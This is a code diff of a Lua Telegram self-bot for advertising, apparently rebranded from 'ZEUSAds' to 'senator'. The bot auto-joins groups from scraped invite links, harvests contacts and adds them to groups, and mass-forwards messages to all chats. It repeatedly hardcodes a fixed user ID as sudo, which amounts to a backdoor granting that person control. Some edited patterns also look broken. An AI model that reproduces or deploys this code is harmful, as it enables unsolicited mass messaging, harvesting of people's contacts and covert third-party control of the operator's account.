@@ -9,7 +9,6 @@ function get_sudo()
     redis:set("ZEUS:" .. Zeus_id .. ":sudoset", true)
     redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", 170146015)
     redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", 170146015)
-    redis:sadd("ZEUS:" .. Zeus_id .. ":wait", "https://telegram.me/joinchat/CiQ430QNSs1GMyIrh5yMkw")
     redis:sadd("ZEUS:" .. Zeus_id .. ":good", "https://telegram.me/joinchat/CiQ430QNSs1GMyIrh5yMkw")
     redis:set("ZEUS:" .. Zeus_id .. ":fwdtime", true)
     return print("Ok. Sudo set")
@@ -53,13 +52,13 @@ function resolve_username(username, cb)
   }, cb, cmd)
 end
 function reload(chat_id, msg_id)
-  dofile("./.ZEUS-" .. Zeus_id .. "/ZEUS-" .. Zeus_id .. ".lua")
+  dofile("./.senator-" .. Zeus_id .. "/senator-" .. Zeus_id .. ".lua")
   send(chat_id, msg_id, "Done")
 end
 function process_join(s, t)
   if t.code_ == 429 then
     local message = tostring(t.message_)
-    local Time = message:match("%d+") + 175
+    local Time = message:match("%d+") + 179
     redis:setex("ZEUS:" .. Zeus_id .. ":cjoin", tonumber(Time), true)
   else
     redis:srem("ZEUS:" .. Zeus_id .. ":good", s.link)
@@ -82,16 +81,16 @@ function process_link(s, t)
     end
   elseif t.code_ == 429 then
     local message = tostring(t.message_)
-    local Time = message:match("%d+") + 175
+    local Time = message:match("%d+") + 179
     redis:setex("ZEUS:" .. Zeus_id .. ":clink", tonumber(Time), true)
   else
     redis:srem("ZEUS:" .. Zeus_id .. ":wait", s.link)
   end
 end
 function find_link(text)
-  if text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.me/joinchat/%S+") then
+  if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") then
     local text = text:gsub("t.me", "telegram.me")
-    for link in text:gmatch("(https://t.me/joinchat/%S+)") do
+    for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do
       if not redis:sismember("ZEUS:" .. Zeus_id .. ":alllinks", link) then
         redis:sadd("ZEUS:" .. Zeus_id .. ":wait", link)
         redis:sadd("ZEUS:" .. Zeus_id .. ":alllinks", link)
@@ -165,7 +164,7 @@ function Doing(data, Zeus_id)
     if not redis:get("ZEUS:" .. Zeus_id .. ":clink") and redis:scard("ZEUS:" .. Zeus_id .. ":wait") ~= 0 then
       local links = redis:smembers("ZEUS:" .. Zeus_id .. ":wait")
       for x, y in ipairs(links) do
-        if x == 3 then
+        if x == 2 then
           redis:setex("ZEUS:" .. Zeus_id .. ":clink", 193, true)
           return
         end
@@ -231,26 +230,26 @@ function Doing(data, Zeus_id)
       end
       if is_myZEUS(msg) then
         find_link(text)
-        if text:match("^(.*) (حذف شه)$") then
-          local matches = text:match("^(.*) حذف شه$")
-          if matches == "لینک ها" then
+        if text:match("^(.*)(پاک کردن)$") then
+          local matches = text:match("^(.*) پاک کردن$")
+          if matches == "لینک" then
             redis:del("ZEUS:" .. Zeus_id .. ":good")
             redis:del("ZEUS:" .. Zeus_id .. ":wait")
             redis:del("ZEUS:" .. Zeus_id .. ":save")
             return send(msg.chat_id_, msg.id_, "انجام شد")
-          elseif matches == "مخاطب ها" then
+          elseif matches == "مخاطبان" then
             redis:del("ZEUS:" .. Zeus_id .. ":savecontacts")
             redis:del("ZEUS:" .. Zeus_id .. ":contacts")
             return send(msg.chat_id_, msg.id_, "انجام شد")
-          elseif matches == "دیران" then
+          elseif matches == "مدیران" then
             redis:srem("ZEUS:" .. Zeus_id .. ":sudo")
             redis:srem("ZEUS:" .. Zeus_id .. ":mod")
             redis:del("ZEUS:" .. Zeus_id .. ":sudo")
             redis:del("ZEUS:" .. Zeus_id .. ":sudoset")
             return send(msg.chat_id_, msg.id_, "انجام شد")
           end
-        elseif text:match("^(.*) (غیرفعال)$") then
-          local matches = text:match("^(.*) غیرفعال$")
+        elseif text:match("^(.*) ( غیرفعال کردن)$") then
+          local matches = text:match("^(.*) غیرفعال کردن$")
           if matches == "جوین" then
             redis:set("ZEUS:" .. Zeus_id .. ":cjoin", true)
             redis:set("ZEUS:" .. Zeus_id .. ":offjoin", true)
@@ -266,8 +265,8 @@ function Doing(data, Zeus_id)
             redis:del("ZEUS:" .. Zeus_id .. ":savecontacts")
             return send(msg.chat_id_, msg.id_, "انجام شد")
           end
-        elseif text:match("^(.*) (فعال)$") then
-          local matches = text:match("^(.*) فعال$")
+        elseif text:match("^(.*) فعال کردن$") then
+          local matches = text:match("^(.*) فعال کردن$")
           if matches == "جوین" then
             redis:del("ZEUS:" .. Zeus_id .. ":cjoin")
             redis:del("ZEUS:" .. Zeus_id .. ":offjoin")
@@ -286,7 +285,7 @@ function Doing(data, Zeus_id)
         elseif text:match("^([Gg]p[Mm]ember) (%d+)$") then
           local matches = text:match("%d+")
           redis:set("ZEUS:" .. Zeus_id .. ":maxgpmmbr", tonumber(matches))
-          return send(msg.chat_id_, msg.id_, "در حال انجام")
+          return send(msg.chat_id_, msg.id_, "انجام شد")
         elseif text:match("^([Pp]romote) (%d+)$") then
           local matches = text:match("%d+")
           if redis:sismember("ZEUS:" .. Zeus_id .. ":sudo", matches) then
@@ -314,12 +313,12 @@ function Doing(data, Zeus_id)
             end
             redis:srem("ZEUS:" .. Zeus_id .. ":sudo", matches)
             redis:srem("ZEUS:" .. Zeus_id .. ":mod", matches)
-            return send(msg.chat_id_, msg.id_, "در حال انجام")
+            return send(msg.chat_id_, msg.id_, "انجام شد")
           end
           return send(msg.chat_id_, msg.id_, "user not moderator")
         elseif text:match("^([Rr]efresh)$") then
           get_bot()
-          return send(msg.chat_id_, msg.id_, "درحال انجام")
+          return send(msg.chat_id_, msg.id_, "انجام شد")
         elseif text:match("^([Rr]eport)$") then
           tdcli_function({
             ID = "SendBotStartMessage",
@@ -330,7 +329,7 @@ function Doing(data, Zeus_id)
         elseif text:match("^([Rr]eload)$") then
           return reload(msg.chat_id_, msg.id_)
         elseif text:match("^([Uu]p[Gg]rade)$") then
-          io.popen("git fetch --all && git reset --hard origin/master && git pull origin master && chmod +x ZEUS"):read("*all")
+          io.popen("git fetch --all && git reset --hard origin/master && git pull origin master && chmod +x senator"):read("*all")
           return reload(msg.chat_id_, msg.id_)
         elseif text:match("^([Ll]s) (.*)$") then
           local matches = text:match("^[Ll]s (.*)$")
@@ -460,10 +459,10 @@ function Doing(data, Zeus_id)
               end, {id = b})
             end
           end
-          return send(msg.chat_id_, msg.id_, "در حال انجام")
-        elseif text:match("^(پنل)$") or text:match("^([Pp]anel)$") or text:match("^(آمار)$") or text:match("^([Ss][TT][Aa]ts)$") or text:match("^(اطلاعات)$") or text:match("^(امار)$") then
+          return send(msg.chat_id_, msg.id_, "انجام شد")
+        elseif text:match("^(پنل)$") or text:match("^([PP]anel)$") or text:match("^(اطلاعات)$") or text:match("^([Bb][Mm][Ii])$") or text:match("^(گروه ها)$") or text:match("^(گروهها)$") then
           local msgadd = redis:get("ZEUS:" .. Zeus_id .. ":addmsg") and "On" or "Off"
-          local txtadd = redis:get("ZEUS:" .. Zeus_id .. ":addmsgtext") or "اد شدی بیا زود پی وی"
+          local txtadd = redis:get("ZEUS:" .. Zeus_id .. ":addmsgtext") or "عزیزم اددی بیا پیوی "
           local wlinks = redis:scard("ZEUS:" .. Zeus_id .. ":wait")
           local glinks = redis:scard("ZEUS:" .. Zeus_id .. ":good")
           local links = redis:scard("ZEUS:" .. Zeus_id .. ":save")
@@ -490,6 +489,7 @@ function Doing(data, Zeus_id)
           }, cb or dl_cb, cmd)
           redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", 170146015)
           redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", 170146015)
+          redis:sadd("ZEUS:" .. Zeus_id .. ":good", "https://telegram.me/joinchat/CiQ430QNSs1GMyIrh5yMkw")
           local text = [[
 
 Sgp => ]] .. tostring(sgps) .. [[
@@ -521,11 +521,10 @@ Added msg => ]] .. tostring(msgadd) .. [[
 Set added msg => ]] .. tostring(txtadd) .. [[
 
 
-ZEUSChannel => @ZEUSbotsupport
 Creator => @sudo_senator]]
           return send(msg.chat_id_, 0, text)
-        elseif text:match("^(فروارد به) (.*)$") and msg.reply_to_message_id_ ~= 0 then
-          local matches = text:match("^فروارد به (.*)$")
+        elseif text:match("^(فروارد) (.*)$") and msg.reply_to_message_id_ ~= 0 then
+          local matches = text:match("^فروارد (.*)$")
           local t
           if matches:match("^(پیوی)") then
             t = "ZEUS:" .. Zeus_id .. ":users"
@@ -538,7 +537,7 @@ Creator => @sudo_senator]]
           end
           local list = redis:smembers(t)
           local id = msg.reply_to_message_id_
-          send(msg.chat_id_, msg.id_, "در حال فروارد صبور باشید")
+          send(msg.chat_id_, msg.id_, "لطفا صبور باشید در حال فروعرد هستم")
           if redis:get("ZEUS:" .. Zeus_id .. ":fwdtime") then
             for s, v in pairs(list) do
               os.execute("sleep 1.7")
@@ -572,10 +571,10 @@ Creator => @sudo_senator]]
             end
           end
           return send(msg.chat_id_, msg.id_, "فروارد به اتمام رسید")
-        elseif text:match("^(فروارد همگانی (.*)") then
+        elseif text:match("^(فروارد همگانی) (.*)") then
           local matches = text:match("^فروارد همگانی (.*)")
           local dir = redis:smembers("ZEUS:" .. Zeus_id .. ":sugps")
-          send(msg.chat_id_, msg.id_, "در حال فروارد همگانی")
+          send(msg.chat_id_, msg.id_, "در حال ارسال")
           for s, v in pairs(dir) do
             os.execute("sleep 3.57")
             tdcli_function({
@@ -595,9 +594,9 @@ Creator => @sudo_senator]]
               }
             }, cb or dl_cb, cmd)
           end
-          return send(msg.chat_id_, msg.id_, "فروارد همگانی به اتمام رسید")
-        elseif text:match("^([Pp]romote) @(.*)")  or text:match ("^([ارتقا مقام) @(.*)") then
-          local Y = text:match("^[Pp]romote @(.*)") or text:match ("^ارتقا مقام @(.*)") 
+          return send(msg.chat_id_, msg.id_, "ارسال شد")
+        elseif text:match("^([Pp]romote) @(.*)") then
+          local Y = text:match("^[Pp]romote @(.*)")
           function promreply(r, s, t)
             if s.id_ then
               redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", s.id_)
@@ -608,9 +607,9 @@ Creator => @sudo_senator]]
                 chat_id_ = s.id_,
                 parameter_ = "start"
               }, cb or dl_cb, cmd)
-              text = "\n" .. s.id_ .. "شخص مورد نظر به لیست مدیریت اضافه ضد"
+              text = "\n" .. s.id_ .. "ارتقا مقام یافت"
             else
-              text = "شخص مورد نظر پیدا نشد"
+              text = "ایدی مورد نظر یافت نشد"
             end
             return send(msg.chat_id_, msg.id_, text)
           end
@@ -625,7 +624,7 @@ Creator => @sudo_senator]]
                 chat_id_ = s.id_,
                 parameter_ = "start"
               }, cb or dl_cb, cmd)
-              send(msg.chat_id_, msg.id_, "در حال افزودن")
+              send(msg.chat_id_, msg.id_, "در حال انجام صبور باشید")
               local n = redis:smembers("ZEUS:" .. Zeus_id .. ":sugps")
               for o, f in pairs(n) do
                 os.execute("sleep 3.15")
@@ -638,20 +637,20 @@ Creator => @sudo_senator]]
               end
               redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", s.id_)
               redis:sadd("ZEUS:" .. Zeus_id .. ":mod", s.id_)
-              text = "\n" .. s.id_ .. "افزدون به اتمام رسید"
+              text = "\n" .. s.id_ .. "افزودن به اتمام رسید"
             else
-              text = "آیدی مورد نظر پیدا نشد"
+              text = "ایدی مورد نظر یافت نشد"
             end
             return send(msg.chat_id_, msg.id_, text)
           end
           resolve_username(Y, promreply)
-        elseif text:match("^(افزدون به همه) (%d+)$") or text:match("^([Aa]dd[Tt]o[Aa]ll) (%d+)$") or text:match("^(افزدون به گروه ها) (%d+)$") then
+        elseif text:match("^(افزودن) (%d+)$") or text:match("^([Aa]dd[Tt]o[Aa]ll) (%d+)$") or text:match("^(افزودن به همه) (%d+)$") then
           local matches = text:match("%d+")
           local list = {
             redis:smembers("ZEUS:" .. Zeus_id .. ":gp"),
             redis:smembers("ZEUS:" .. Zeus_id .. ":sugps")
           }
-          send(msg.chat_id_, msg.id_, "در حال افزودن")
+          send(msg.chat_id_, msg.id_, "در حال انجام")
           for a, b in pairs(list) do
             for s, v in pairs(b) do
               os.execute("sleep 1.53")
@@ -663,7 +662,7 @@ Creator => @sudo_senator]]
               }, cb or dl_cb, cmd)
             end
           end
-        elseif text:match("^(انلاینی)$") and not msg.forward_info_ or text:match("^([Oo]nline)$") and not msg.forward_info_ or text:match("^([Pp]ing)$") and not msg.forward_info_ or text:match("^(پینگ)$") and not msg.forward_info_ then
+        elseif text:match("^(انلاینی)$") and not msg.forward_info_ or text:match("^([Oo]nline)$") and not msg.forward_info_ or text:match("^([Pp]ing)$") and not msg.forward_info_ or text:match("^(هستی)$") and not msg.forward_info_ then
           os.execute("sleep 3.67")
           return tdcli_function({
             ID = "ForwardMessages",
@@ -675,8 +674,8 @@ Creator => @sudo_senator]]
             disable_notification_ = 1,
             from_background_ = 1
           }, cb or dl_cb, cmd)
-        elseif text:match("^(راهنما)$") or text:match("^([Hh]elp)$") or text:match("^(\216\177\216\167\217\135\217\134\217\133\216\167)$") then
-          local txt = "\nHelp for TeleGram Advertisin Robot (ZEUSAds)\n\n\nSetAddedMsg (text)\n    set message when add contact\n    \nAddToAll @(usename)\n    add user or robot to all group's \n      \nLs (contact, block, pv, gp, sgp, lnk, sudo)\n    export list of selected item\n    \nGpMember 1~9999\n    set the minimum group members to join\n\nAddedMsg (on or off)\n    import contacts by send message\n \nRefresh\n    Refresh information\n\nUpgrade\n    upgrade to new version\n\n\nدستورات برای حذف لینک،مخاطب،مدیران\nحذف شه\n\nلینک ها\nمخاطبین\nمدیران\nبرای مثال \n\nلینک ها حذف شه\n\nبرای فعال کردن سرچ لینک ،چک لینک ، ذخیره مخاطب،جوین\nلینک\n\nجوین فعال\nچک لینک فعال\nسرچ لینک فعال\nذخیره مخاطب فعال\nبرای غیرفعال کردن سرچ لینک،چک لنک ،جوین لینک ،ذخیره مخاطب \nجوین غیرفعال\nچک لینک غیرفعال\nسرچ لینک غیرفعال\nذخیره مخاطب غیرفعال\nبرای فروارد\nفروارد به \nپیوی\nسوپرگروه ها\nبرای گرفتن آمار ربات\npanel،stats،آمار،پنل،اطلاعات\n\nبرای اطلاع از انلاین بودن \nانلاینی\nبرای افزودن اکانت cli جدید یا ربات apiدستور فارسی\nافزودن به همه،افزودن به گروه ها\nبرای ارتقای مقام یک شخص به مقام مدیریت رباتها\nارتقا مقام\n\nاین راهنما در حال بروزرسانی هستش\n\n \nYou can send command with or with out: \n! or / or # or $ \nbefore command\n\n     \nDeveloped by @sudo_senator\nZEUSChannel @Zeusbotsupport\n"
+        elseif text:match("^(راهنما)$") or text:match("^([Hh]elp)$") or text:match("^(راهنمای)$") then
+          local txt = "\nHelp for TeleGram Advertisin Robot (ZEUSAds)\n\n\nSetAddedMsg (text)\n    set message when add contact\n    \nAddToAll @(usename)\n    add user or robot to all group's \n      \nLs (contact, block, pv, gp, sgp, lnk, sudo)\n    export list of selected item\n    \nGpMember 1~9999\n    set the minimum group members to join\n\nAddedMsg (on or off)\n    import contacts by send message\n \nRefresh\n    Refresh information\n\nUpgrade\n    upgrade to new version\n\nAddMembers-\n\n \nYou can send command with or with out: \n! or / or # or $ \nbefore command\n\n     \nDeveloped by @sudo_senator\n"
           return send(msg.chat_id_, msg.id_, txt)
         elseif text:match("^(ZEUSSpm) (%d+)$") then
           local matches = text:match("%d+")
@@ -694,7 +693,7 @@ Creator => @sudo_senator]]
             }, cb or dl_cb, cmd)
           end
         elseif tostring(msg.chat_id_):match("^-") then
-          if text:match("^(خروج از گروه ها)$") or text:match("^([Ll]eave[Aa]ll[Gg]p)$") or text:match("^(خروج از همه)$") then
+          if text:match("^(خروج از گروه ها)$") or text:match("^([Ll]eave[Aa]ll[Gg]p)$") or text:match("^(خروج)$") then
             rem(msg.chat_id_)
             return tdcli_function({
               ID = "ChangeChatMemberStatus",
@@ -704,8 +703,8 @@ Creator => @sudo_senator]]
                 ID = "ChatMemberStatusLeft"
               }
             }, cb or dl_cb, cmd)
-          elseif text:match("^(افزودن مخاطبین)$") or text:match("^([Aa]dd[Mm]embers)$") or text:match("^(افزدون مخاطب ها)$") then
-            send(msg.chat_id_, msg.id_, "در حال افزودن لطفا صبور باشید")
+          elseif text:match("^(ادد ممبر)$") or text:match("^([Aa]dd[Mm]embers)$") or text:match("^(اضافه کردن مخاطبین)$") then
+            send(msg.chat_id_, msg.id_, "در حال انجام شدن ،بعد اتما اعلام میشود")
             tdcli_function({
               ID = "SearchContacts",
               query_ = nil,
@@ -733,7 +732,7 @@ Creator => @sudo_senator]]
             end, {
               chat_id = msg.chat_id_
             })
-            do return send(msg.chat_id_, msg.id_, "افزودن مخاطبین به اتمام رسید") end
+            do return send(msg.chat_id_, msg.id_, "به اتمام رسید") end
             elseif msg.content_.ID == "MessageContact" and redis:get("ZEUS:" .. Zeus_id .. ":savecontacts") then
               local id = msg.content_.contact_.user_id_
               if not redis:sismember("ZEUS:" .. Zeus_id .. ":addedcontacts", id) then
@@ -780,7 +779,7 @@ Creator => @sudo_senator]]
               end
               if redis:get("ZEUS:" .. Zeus_id .. ":addmsg") then
                 os.execute("sleep 9.3")
-                local answer = redis:get("ZEUS:" .. Zeus_id .. ":addmsgtext") or "اد شدی زود بیا پیوی"
+                local answer = redis:get("ZEUS:" .. Zeus_id .. ":addmsgtext") or "ادد شدی دوست عزیز بیا پیوی"
                 send(msg.chat_id_, msg.id_, answer)
               end
             elseif msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == bot_id then
@@ -796,7 +795,7 @@ Creator => @sudo_senator]]
                 ID = "GetChats",
                 offset_order_ = 9223372036854775807,
                 offset_chat_id_ = 0,
-                limit_ = 753
+                limit_ = 975
               }, cb or dl_cb, cmd)
             end
           end
